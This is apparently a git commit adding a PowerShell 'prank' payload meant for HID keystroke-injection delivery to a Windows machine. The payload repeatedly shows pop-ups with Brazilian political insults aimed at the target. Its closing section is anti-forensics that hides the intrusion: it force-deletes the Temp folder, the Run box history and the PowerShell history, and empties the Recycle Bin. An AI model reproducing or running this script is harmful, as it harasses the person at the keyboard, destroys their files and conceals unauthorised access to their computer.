95f4c8e326ceef540394eeb90de5e35ee3d9962e
RAFAEL NASSER <rafael@icheques.com.br>
2023-01-18 01:22:31 -0300

    Testando bully tech pt

---
+++ Rage-PopUps.ps1
@@ -0,0 +1,81 @@
+############################################################################################################################################################                      
+#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
+# Title        : Rage-PopUps       | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
+# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
+# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
+# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
+# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
+# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
+#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
+#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
+#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
+#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
+#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
+#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
+#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
+#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
+#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
+############################################################################################################################################################
+
+<#
+.SYNOPSIS
+	This script will open a series of pop-ups in order to taunt your target. I wrote it initially to target call center scammers.
+
+.DESCRIPTION 
+	This program is meant to taunt your target. Below are a series insults you can modify as you like. The program will generate a Pop-up 
+	for each one of them. 
+#>
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+Add-Type -AssemblyName System.Windows.Forms
+
+# The number of times you want it to cycle through your list of questions
+
+$cycles = 4
+
+# List as many questions here as you like, it will cycle through all of them
+
+$msgs = @(
+"Gás R$50. FAZ O L!!?"
+"Gasolina R$6. FAZ O L!!"
+"Imposto de renda para +1.5 salários mínimos (VOCE). FAZ O L!!"
+"Bolsa Presidiario R$1800 Salário Mínimo R$1300. FAZ O L!!"
+"Produtos em falta no mercado? FAZ O L!!"
+"Votou 13?? Paga a conta e FAZ O L!!"
+"Usou seu bolsa picanha, troxa? FAZ O L!!"
+"Mais Médicos = escravidão e voce votou nisso. FAZ O L!!"
+"As eleições foram roubdas e voce aceitou de boa. Agora faz o L!!"
+"Pronto para passar fome com inflação em +20%? FAZ O L!!"
+)
+
+for ($i=1; $i -le $cycles; $i++) {
+
+Foreach ($msg in $msgs) {
+[System.Windows.Forms.MessageBox]::Show($msg , "You're-a-Loser.exe" , 4 , 'Question')
+}
+}
+
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
